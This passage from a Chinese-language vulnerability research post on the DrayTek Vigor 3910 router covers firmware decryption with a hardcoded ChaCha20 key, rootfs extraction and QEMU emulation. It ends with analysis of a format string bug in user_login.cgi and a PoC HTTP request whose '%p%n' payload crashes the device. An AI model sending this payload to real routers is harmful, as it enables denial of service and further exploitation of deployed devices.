class="keyword">as</span> f:</span><br><span class="line">        f.write(dec_data)</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Done!&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(sys.argv) != <span class="number">2</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Usage: python3 %s &lt;enc_Image&gt;&quot;</span> % sys.argv[<span class="number">0</span>])</span><br><span class="line">        exit(<span class="number">0</span>)</span><br><span class="line">    </span><br><span class="line">    filename = sys.argv[<span class="number">1</span>]</span><br><span class="line">    do_decrypt(filename)</span><br></pre></td></tr></table></figure></div>

<p>解密之后得到 ARM64 Linux boot Image，检查其熵值</p>
<table>
<thead>
<tr>
<th align="center"><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/vigor-3910-6.png"
                     
                ></th>
</tr>
</thead>
<tbody><tr>
<td align="center"><em>enc_Image_decrypted.bin 的熵值</em></td>
</tr>
</tbody></table>
<p>熵值有变化，进一步查看分析结果发现，Linux 文件系统是以 cpio 形式嵌入到内核中的，binwalk 无法直接解包，所以接下来还要对内核进行分析，尝试解压 cpio 文件。</p>
<p>逆向分析内核，通过搜索字符串找到 sub_991C1C 函数</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">sub_991C1C</span><span class="params">(_BYTE *a1, __int64 a2)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">  qword_9CFAA8 = sub_14DA30(qword_34BCB60, <span class="number">0x24000C0</span>i64);</span><br><span class="line">  qword_9CFB60 = sub_11AF70(<span class="number">0x2003</span>i64, <span class="number">0x24000C0</span>, <span class="number">2u</span>);</span><br><span class="line">  v4 = sub_14DA30(qword_34BCB90, <span class="number">0x24000C0</span>i64);</span><br><span class="line">  qword_9CFB68 = v4;</span><br><span class="line">  <span class="keyword">if</span> ( !qword_9CFAA8 || (qword_9CFB60 ? (v5 = v4 == <span class="number">0</span>) : (v5 = <span class="number">1</span>), v5) )</span><br><span class="line">    sub_F312C(aCanTAllocateBu_1);               <span class="comment">// can&#x27;t allocate buffers</span></span><br><span class="line">  qword_9CFA60 = <span class="number">0</span>i64;</span><br><span class="line">  qword_9CFA80 = <span class="number">0</span>i64;</span><br><span class="line">  dword_9CFA88 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">while</span> ( !qword_9CFA60 &amp;&amp; a2 != <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v7 = qword_9CFA80;</span><br><span class="line">    <span class="keyword">if</span> ( *a1 == <span class="number">0x30</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( (qword_9CFA80 &amp; <span class="number">3</span>) != <span class="number">0</span> )</span><br><span class="line">        <span class="keyword">goto</span> LABEL_18;</span><br><span class="line">      dword_9CFA88 = <span class="number">0</span>;</span><br><span class="line">      v8 = sub_991558(a1, a2);</span><br><span class="line">      a1 += v8;</span><br><span class="line">      a2 -= v8;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> ( *a1 )</span><br><span class="line">    &#123;</span><br><span class="line">LABEL_18:</span><br><span class="line">      qword_9CFA80 = <span class="number">0</span>i64;</span><br><span class="line">      v9 = sub_9AE094(a1, a2, &amp;v18);</span><br><span class="line">      <span class="keyword">if</span> ( v9 )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( v9(a1, a2, <span class="number">0</span>i64, sub_9915A8, <span class="number">0</span>i64, &amp;qword_34A5078, error) )</span><br><span class="line">          error(aDecompressorFa);               <span class="comment">// decompressor failed</span></span><br><span class="line">      &#125;</span><br><span class="line">        <span class="comment">// ...</span></span><br><span class="line">    &#125;</span><br><span class="line">      <span class="comment">// ...</span></span><br><span class="line">  &#125;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>代码中包含 <code>decompressor failed</code> 等提示，似乎和解压数据相关，对 sub_991C1C 函数进行交叉引用定位到以下代码</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line">__int64 <span class="title function_">sub_991F9C</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line"> <span class="comment">// ...</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( sub_991C1C(compressed, qword_33EB2F0) )</span><br><span class="line">    sub_F312C(&amp;qword_8B3DC0);</span><br></pre></td></tr></table></figure></div>

<p>sub_991C1C 函数第一个参数是全局变量，数据以 0x184C2102 开头，这是 LZ4 压缩的<a class="link"   href="https://android.googlesource.com/platform/external/lz4/+/HEAD/doc/lz4_Frame_format.md" >标志<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>。而 qword_33EB2F0 存放的值为 0x2A0B6D6，为压缩数据的长度。</p>
<p>因此我们可以根据以上参数从内核中提取出这部分 lz4 压缩的数据，然后手动解压。</p>
<div class="code-container" data-rel="Sh"><figure class="iseeu highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="built_in">dd</span> <span class="keyword">if</span>=enc_Image_decrypted.bin of=lz4.bin bs=1 skip=10353688 count=44086998</span><br><span class="line">lz4 -d ./lz4.bin decompressed.bin</span><br></pre></td></tr></table></figure></div>

<p>最终得到一个 cpio 压缩文档，直接用 cpio 命令解压，解压后即可看到 Linux 文件系统。</p>
<div class="code-container" data-rel="Sh"><figure class="iseeu highlight sh"><table><tr><td class="code"><pre><span class="line">cpio -idmv &lt; ./decompressed.bin</span><br></pre></td></tr></table></figure></div>

<p>将以上流程编写代码实现自动化</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> ChaCha20</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">do_decrypt</span>(<span class="params">nonce, enc_data</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[*] Decrypt&quot;</span>)</span><br><span class="line">    key = <span class="string">b&quot;0DraytekKd5Eason3DraytekKd5Eason&quot;</span></span><br><span class="line">    cipher = ChaCha20.new(key=key, nonce=nonce)</span><br><span class="line">    dec_data = cipher.decrypt(enc_data)</span><br><span class="line">    <span class="keyword">return</span> dec_data</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">split_enc_image</span>(<span class="params">data</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[*] Split enc_Image&quot;</span>)</span><br><span class="line">        model_len = struct.unpack(<span class="string">&quot;&lt;I&quot;</span>, data[<span class="number">0x40</span>:<span class="number">0x44</span>])[<span class="number">0</span>]</span><br><span class="line">        model = data[<span class="number">0x44</span>: <span class="number">0x44</span> + model_len]</span><br><span class="line">        <span class="keyword">if</span> model != <span class="string">b&quot;v3910&quot;</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;[-] Error: invalid file&quot;</span>)</span><br><span class="line">            exit(<span class="number">0</span>)</span><br><span class="line">        </span><br><span class="line">        _tmp = data.find(<span class="string">b&quot;nonce&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> _tmp == -<span class="number">1</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;[-] Error: invalid file&quot;</span>)</span><br><span class="line">            exit(<span class="number">0</span>)</span><br><span class="line">        </span><br><span class="line">        nonce = data[_tmp + <span class="number">9</span>: _tmp + <span class="number">9</span> + <span class="number">0xC</span>]</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[+] nonce: %s&quot;</span> % nonce.decode())</span><br><span class="line"></span><br><span class="line">        enc_image_start = data.find(<span class="string">b&quot;enc_Image&quot;</span>)</span><br><span class="line">        enc_image_len = struct.unpack(<span class="string">&quot;&lt;I&quot;</span>, data[enc_image_start + <span class="number">9</span>: enc_image_start + <span class="number">9</span> + <span class="number">4</span>])[<span class="number">0</span>]</span><br><span class="line">        enc_data = data[enc_image_start + <span class="number">13</span>: enc_image_start + <span class="number">13</span> + enc_image_len]</span><br><span class="line">        <span class="keyword">return</span> (nonce, enc_data)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[-] Error: split_enc_image&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(e)</span><br><span class="line">        exit(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">split_lz4_image</span>(<span class="params">data</span>):</span><br><span class="line">    <span class="keyword">try</span>:    <span class="comment"># hexacon_draytek_2022_final</span></span><br><span class="line">        start = data.find(<span class="string">b&quot;\x02\x21\x4C\x18&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> start == -<span class="number">1</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;[-] Error: no lz4 header&quot;</span>)</span><br><span class="line">            exit(<span class="number">0</span>)</span><br><span class="line">        </span><br><span class="line">        end = data.find(<span class="string">b&quot;R!!!&quot;</span>, start)</span><br><span class="line">        tmp_end = end</span><br><span class="line">        <span class="keyword">while</span> tmp_end != -<span class="number">1</span>:</span><br><span class="line">            end = tmp_end</span><br><span class="line">            tmp_end = data.find(<span class="string">b&quot;R!!!&quot;</span>, end + <span class="number">1</span>)</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> end == -<span class="number">1</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;[-] Error: no trailer&quot;</span>)</span><br><span class="line">            exit(<span class="number">0</span>)</span><br><span class="line">        </span><br><span class="line">        end += (<span class="number">0x14</span> - <span class="number">6</span>)</span><br><span class="line">        <span class="keyword">return</span> data[start: end]</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[-] Error: split_lz4_image&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(e)</span><br><span class="line">        exit(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decompress</span>():</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        os.system(<span class="string">&quot;lz4 -d ./temp.bin ./rootfs.cpio&quot;</span>)</span><br><span class="line">        os.remove(<span class="string">&quot;./temp.bin&quot;</span>)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[-] Error: decompress&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(e)</span><br><span class="line">        exit(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(sys.argv) != <span class="number">2</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[!] Usage: python3 %s &lt;firmware&gt;&quot;</span> % sys.argv[<span class="number">0</span>])</span><br><span class="line">        exit(<span class="number">0</span>)</span><br><span class="line">    </span><br><span class="line">    filename = sys.argv[<span class="number">1</span>]</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(filename, <span class="string">&quot;rb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        data = f.read()</span><br><span class="line">    </span><br><span class="line">    nonce, enc_data = split_enc_image(data)</span><br><span class="line">    dec_data = do_decrypt(nonce, enc_data)</span><br><span class="line">    lz4_data = split_lz4_image(dec_data)</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;temp.bin&quot;</span>, <span class="string">&quot;wb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        f.write(lz4_data)</span><br><span class="line">    decompress()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[*] Saved to ./rootfs.cpio&quot;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<h2 id="模拟执行"><a href="#模拟执行" class="headerlink" title="模拟执行"></a>模拟执行</h2><p>3910 设备上运行了一个 Linux 系统，但主要的业务逻辑都位于 qemu 启动的 sohod64.bin 中，即然是 QEMU 启动，理论上也可以在本地运行起来。</p>
<p>根据参考文章，检查 firmware 目录下的启动脚本，发现 qemu 启动时存在一个非标准参数 <code>-dtb DrayTek</code>，猜测是开发者修改过 QEMU 源代码，自行添加的参数。</p>
<p>Draytek 提供设备的 GPL <a class="link"   href="https://gplsource.draytek.com/?dir=" >代码<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>，下载 3910 型号的 GPL 代码分析确定，开发者为 QEMU 添加了一些新功能，用来支持 drayos 运行，所以我们需要编译这份 GPL 代码。</p>
<div class="code-container" data-rel="Sh"><figure class="iseeu highlight sh"><table><tr><td class="code"><pre><span class="line">./configure --enable-kvm --enable-debug --target-list=aarch64-softmmu</span><br><span class="line">make</span><br></pre></td></tr></table></figure></div>

<p>编译好之后得到需要的 qemu-system-aarch64，接下来要修改原始的启动脚本，适配本地环境。</p>
<p>宿主机需要新添加两张网卡，修改 network.sh 脚本，将网卡名称替换到脚本中</p>
<div class="code-container" data-rel="Sh"><figure class="iseeu highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line">iflan=ens38</span><br><span class="line">ifwan=ens39</span><br><span class="line">mylanip=<span class="string">&quot;192.168.1.2&quot;</span></span><br><span class="line"></span><br><span class="line">brctl delbr br-lan</span><br><span class="line">brctl delbr br-wan</span><br><span class="line"></span><br><span class="line">ip <span class="built_in">link</span> add br-lan <span class="built_in">type</span> bridge</span><br><span class="line">ip tuntap add qemu-lan mode tap</span><br><span class="line">brctl addif br-lan <span class="variable">$iflan</span></span><br><span class="line">brctl addif br-lan qemu-lan</span><br><span class="line">ip addr flush dev <span class="variable">$iflan</span></span><br><span class="line">ifconfig br-lan <span class="variable">$mylanip</span></span><br><span class="line">ifconfig br-lan up</span><br><span class="line">ifconfig qemu-lan up</span><br><span class="line">ifconfig <span class="variable">$iflan</span> up</span><br><span class="line"></span><br><span class="line">ip <span class="built_in">link</span> add br-wan <span class="built_in">type</span> bridge</span><br><span class="line">ip tuntap add qemu-wan mode tap</span><br><span class="line">brctl addif br-wan <span class="variable">$ifwan</span></span><br><span class="line">brctl addif br-wan qemu-wan</span><br><span class="line">ip addr flush dev <span class="variable">$ifwan</span></span><br><span class="line">ifconfig br-lan <span class="variable">$mylanip</span></span><br><span class="line">ifconfig br-wan up</span><br><span class="line">ifconfig qemu-wan up</span><br><span class="line">ifconfig <span class="variable">$ifwan</span> up</span><br><span class="line"></span><br><span class="line">brctl show</span><br><span class="line"></span><br><span class="line"><span class="comment">#for speed test</span></span><br><span class="line">ethtool -K <span class="variable">$iflan</span> gro off</span><br><span class="line">ethtool -K <span class="variable">$iflan</span> gso off</span><br><span class="line"></span><br><span class="line">ethtool -K <span class="variable">$ifwan</span> gro off</span><br><span class="line">ethtool -K <span class="variable">$ifwan</span> gso off</span><br><span class="line"></span><br><span class="line">ethtool -K qemu-lan gro off</span><br><span class="line">ethtool -K qemu-lan gso off</span><br><span class="line"></span><br><span class="line">ethtool -K qemu-wan gro off</span><br><span class="line">ethtool -K qemu-wan gso off</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#for telnet from linux to drayos 192.168.1.1</span></span><br><span class="line">ethtool -K br-lan tx off</span><br></pre></td></tr></table></figure></div>

<p>然后构造启动脚本，首先按照参考文章的提示，修改自带的启动脚本，当尝试启动文中提到的版本(4.3.1)时一切正常，但启动新版时会出现错误</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">[qemu_ivshmem_write_internal:2729] already wait for more than 100ms, check host.</span><br><span class="line"></span><br><span class="line">## Drv software rebooting : cmd=1, fun=check_max_portmap_sessions, line=31874 ##</span><br><span class="line"></span><br><span class="line"> dump_backtrace: fp:0x467ffe60, pc:0x4064fc48</span><br><span class="line">Call trace: 0x4064fc48 0x406fac58 0x404757a8 0x407bb120 0x407dfec4 0x406fbe84 0x406fb304 0x406fb250 0x40000c08 0x40000078 0x40000040</span><br><span class="line">reboot handler not init yet</span><br><span class="line">Init MAX session 300000 </span><br><span class="line">portmap addr_range 0x1c9c380 &gt; exmem_portmap_end_addr 0x0</span><br><span class="line"></span><br><span class="line"> !!! NULL, malloc Portmap memory fail</span><br><span class="line"> dray_nat_allocate_memory : malloc memory fail</span><br></pre></td></tr></table></figure></div>

<p>通过逆向分析发现和 portmap 内存有关系，而这块内存又和参数 memsize 有关，因此尝试将 memsize 值修改为 1</p>
<div class="code-container" data-rel="Sh"><figure class="iseeu highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"><span class="comment"># 1. do &quot;fw_setenv purelinux 1&quot; first , then reboot</span></span><br><span class="line"><span class="comment"># 2. do setup_qemu_linux.sh (default P3 as WAN, P4 as LAN, for both 1Gbps connection only)</span></span><br><span class="line"><span class="comment"># 3. remember to recover to normal mode by &quot;fw_setenv purelinux 0&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="title">rangen</span></span>() &#123;</span><br><span class="line">   <span class="built_in">printf</span> <span class="string">&quot;%02x&quot;</span> `<span class="built_in">shuf</span> -i 1-255 -n 1`</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="title">rangen1</span></span>() &#123;</span><br><span class="line">   <span class="built_in">printf</span> <span class="string">&quot;%x&quot;</span> `<span class="built_in">shuf</span> -i 1-15 -n 1`</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="title">wan_mac</span></span>()&#123;</span><br><span class="line">        idx=<span class="variable">$1</span></span><br><span class="line">        <span class="built_in">printf</span> <span class="string">&quot;%02x\n&quot;</span> $((<span class="number">0</span>x<span class="variable">$&#123;C&#125;</span>+<span class="number">0</span>x<span class="variable">$idx</span>)) | <span class="built_in">tail</span> -c 3 <span class="comment"># 3 = 2 digit + 1 terminating character</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">A=$(rangen); B=$(rangen); C=$(rangen);</span><br><span class="line">LAN_MAC=<span class="string">&quot;00:1d:aa:<span class="variable">$&#123;A&#125;</span>:<span class="variable">$&#123;B&#125;</span>:<span class="variable">$&#123;C&#125;</span>&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> [ ! -p serial0 ]; <span class="keyword">then</span></span><br><span class="line">    <span class="built_in">mkfifo</span> serial0</span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"><span class="keyword">if</span> [ ! -p serial1 ]; <span class="keyword">then</span></span><br><span class="line">    <span class="built_in">mkfifo</span> serial1</span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line">platform_path=<span class="string">&quot;./platform&quot;</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;x86&quot;</span> &gt; <span class="variable">$platform_path</span></span><br><span class="line">enable_kvm_path=<span class="string">&quot;./enable_kvm&quot;</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;kvm&quot;</span> &gt; <span class="variable">$enable_kvm_path</span></span><br><span class="line"></span><br><span class="line">cfg_path=<span class="string">&quot;./magic_file&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;GCI_SKIP&quot;</span> &gt; gci_magic</span><br><span class="line"></span><br><span class="line"><span class="built_in">mkdir</span> -p ../data/uffs</span><br><span class="line"><span class="built_in">touch</span> ../data/uffs/v3910_ram_flash.bin</span><br><span class="line">uffs_flash=<span class="string">&quot;../data/uffs/v3910_ram_flash.bin&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;1&quot;</span> &gt; memsize</span><br><span class="line"></span><br><span class="line">(<span class="built_in">sleep</span> 20 &amp;&amp; ethtool -K qemu-lan tx off) &amp;</span><br><span class="line"></span><br><span class="line">model=<span class="string">&quot;./model&quot;</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;3&quot;</span> &gt; ./model</span><br><span class="line"></span><br><span class="line"><span class="built_in">rm</span> -rf ./app &amp;&amp; <span class="built_in">mkdir</span> -p ./app/gci</span><br><span class="line">GCI_PATH=<span class="string">&quot;./app/gci&quot;</span></span><br><span class="line">GCI_FAIL=<span class="string">&quot;./app/gci_exp_fail&quot;</span></span><br><span class="line">GDEF_FILE=<span class="string">&quot;<span class="variable">$GCI_PATH</span>/draycfg.def&quot;</span></span><br><span class="line">GEXP_FLAG=<span class="string">&quot;<span class="variable">$GCI_PATH</span>/EXP_FLAG&quot;</span></span><br><span class="line">GEXP_FILE=<span class="string">&quot;<span class="variable">$GCI_PATH</span>/draycfg.exp&quot;</span></span><br><span class="line">GDEF_FILE_ADDR=<span class="string">&quot;0x4de0000&quot;</span></span><br><span class="line">GEXP_FLAG_ADDR=<span class="string">&quot;0x55e0000&quot;</span></span><br><span class="line">GEXP_FILE_ADDR=<span class="string">&quot;0x55e0010&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;0#&quot;</span> &gt; <span class="variable">$GEXP_FLAG</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;19831026&quot;</span> &gt; <span class="variable">$GEXP_FILE</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;GCI_SKIP&quot;</span> &gt; <span class="variable">$GDEF_FILE</span></span><br><span class="line"></span><br><span class="line">SHM_SIZE=16777216</span><br><span class="line">./qemu-system-aarch64 -M virt,gic_version=3 -cpu cortex-a57 -m 1024 -L ../usr/share/qemu \</span><br><span class="line">           -kernel ./vqemu/sohod64.bin <span class="variable">$serial_option</span> -dtb DrayTek \</span><br><span class="line">           -nographic <span class="variable">$gdb_serial_option</span> <span class="variable">$gdb_remote_option</span> \</span><br><span class="line">           -device virtio-net-pci,netdev=network-lan,mac=<span class="variable">$&#123;LAN_MAC&#125;</span> \</span><br><span class="line">           -netdev tap,<span class="built_in">id</span>=network-lan,ifname=qemu-lan,script=no,downscript=no \</span><br><span class="line">           -device virtio-net-pci,netdev=network-wan,mac=00:1d:aa:<span class="variable">$&#123;A&#125;</span>:<span class="variable">$&#123;B&#125;</span>:$(wan_mac 1) \</span><br><span class="line">           -netdev tap,<span class="built_in">id</span>=network-wan,ifname=qemu-wan,script=no,downscript=no \</span><br><span class="line">           -device virtio-serial-pci -chardev pipe,<span class="built_in">id</span>=ch0,path=serial0 \</span><br><span class="line">           -device virtserialport,chardev=ch0,name=serial0 \</span><br><span class="line">           -device loader,file=<span class="variable">$platform_path</span>,addr=0x25fff0 \</span><br><span class="line">           -device loader,file=<span class="variable">$cfg_path</span>,addr=0x260000 \</span><br><span class="line">           -device loader,file=<span class="variable">$uffs_flash</span>,addr=0x00be0000 \</span><br><span class="line">           -device loader,file=<span class="variable">$enable_kvm_path</span>,addr=0x25ffe0 \</span><br><span class="line">           -device loader,file=memsize,addr=0x25ff67 \</span><br><span class="line">	        -device loader,file=<span class="variable">$model</span>,addr=0x25ff69 \</span><br><span class="line">           -device loader,file=<span class="variable">$GDEF_FILE</span>,addr=<span class="variable">$GDEF_FILE_ADDR</span> \</span><br><span class="line">           -device loader,file=<span class="variable">$GEXP_FLAG</span>,addr=<span class="variable">$GEXP_FLAG_ADDR</span> \</span><br><span class="line">           -device loader,file=<span class="variable">$GEXP_FILE</span>,addr=<span class="variable">$GEXP_FILE_ADDR</span> \</span><br><span class="line">           -device nec-usb-xhci,<span class="built_in">id</span>=usb \</span><br><span class="line">           -device ivshmem-plain,memdev=hostmem \</span><br><span class="line">           -object memory-backend-file,size=<span class="variable">$&#123;SHM_SIZE&#125;</span>,share,mem-path=/dev/shm/ivshmem,<span class="built_in">id</span>=hostmem</span><br></pre></td></tr></table></figure></div>

<p>启动时先执行 network.sh，随后执行 myrun.sh，访问 192.168.1.1 即可看到登录页面</p>
<table>
<thead>
<tr>
<th align="center"><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/vigor-3910-7.png"
                     
                ></th>
</tr>
</thead>
<tbody><tr>
<td align="center"><em>系统成功启动</em></td>
</tr>
</tbody></table>
<h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>根据描述，漏洞出现在 user_login.cgi 中，在 soho64.bin 搜索该字符串，结果中有一个地址找不到任何引用，在程序中搜索该字符串的地址可以找到 IDA 未识别的位置，此处存在大量 URI -&gt; handler 的映射关系，因此也能找到 user_login.cgi 的 handler，其中关键代码如下</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line">*(a4 + <span class="number">0x10</span>LL) = <span class="number">200</span>;</span><br><span class="line"><span class="keyword">if</span> ( getCGI(v54, &amp;v61, v55) )</span><br><span class="line">&#123;</span><br><span class="line">  v4 = GetCGIbyFieldName(v53 + <span class="number">56</span>, <span class="string">&quot;fid&quot;</span>);<span class="comment">// fid</span></span><br><span class="line">  v62 = atoi(v4);</span><br><span class="line">  <span class="keyword">switch</span> ( v62 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">101</span>:</span><br><span class="line">      user_login_101(v53 + <span class="number">56</span>);</span><br><span class="line">      resp(*(v54 + <span class="number">0xC</span>LL), <span class="string">&quot;Location: /weblogin.htm\n\n&quot;</span>, <span class="number">256LL</span>);</span><br><span class="line">      <span class="keyword">return</span> res(v53 + <span class="number">56</span>);</span><br><span class="line">          <span class="comment">// ...</span></span><br><span class="line">  &#125;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>首先获取用户传递的 fid 参数，转换成 int 类型之后进入 switch 处理</p>
<p>当 fid 等于 101 时，会调用 user_login_101 函数</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">user_login_101</span><span class="params">(<span class="type">int</span> a1)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">  v12 = GetCGIbyFieldName(a1, <span class="string">&quot;src_ip&quot;</span>);</span><br><span class="line">  v11 = GetCGIbyFieldName(a1, <span class="string">&quot;target_url&quot;</span>);</span><br><span class="line">  v1 = GetCGIbyFieldName(a1, <span class="string">&quot;mode&quot;</span>);</span><br><span class="line">  v10 = atoi(v1);</span><br><span class="line">  v2 = GetCGIbyFieldName(a1, <span class="string">&quot;fw_set&quot;</span>);</span><br><span class="line">  v9 = atoi(v2);</span><br><span class="line">  v3 = GetCGIbyFieldName(a1, <span class="string">&quot;fw_rule&quot;</span>);</span><br><span class="line">  v8 = atoi(v3);</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">memset</span>(&amp;buf1, <span class="number">0</span>, <span class="number">0x14</span>uLL);</span><br><span class="line">  <span class="built_in">memset</span>(&amp;buf2, <span class="number">0</span>, <span class="number">0xFF</span>uLL);</span><br><span class="line">  <span class="built_in">snprintf</span>(&amp;buf1, <span class="number">20LL</span>, v12, v4);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">snprintf</span>(&amp;buf2, <span class="number">255LL</span>, v11, v5);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>明显看到漏洞，代码从用户请求中获取 src_ip 等参数，没有经过任何过滤就将其作为格式化字符串传入 snprintf 函数，存在格式化字符串漏洞。</p>
<p>构造出 PoC</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /cgi-bin/user_login.cgi HTTP/1.1</span><br><span class="line">Host: 192.168.1.1</span><br><span class="line">Content-Length: 74</span><br><span class="line">Origin: http://192.168.1.1</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">fid=101&amp;src_ip=111&amp;target_url=%25%70%25%6e&amp;mode=1&amp;fw_set=1&amp;fw_rule=1</span><br></pre></td></tr></table></figure></div>

<p>发送到设备后在终端观察系统已经崩溃</p>
<table>
<thead>
<tr>
<th align="center"><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/vigor-3910-8.png"
                     
                ></th>
</tr>
</thead>
<tbody><tr>
<td align="center"><em>系统崩溃</em></td>
</tr>
</tbody></table>
<h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><p><a class="link"   href="https://www.hexacon.fr/slides/hexacon_draytek_2022_final.pdf" >https://www.hexacon.fr/slides/hexacon_draytek_2022_final.pdf<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
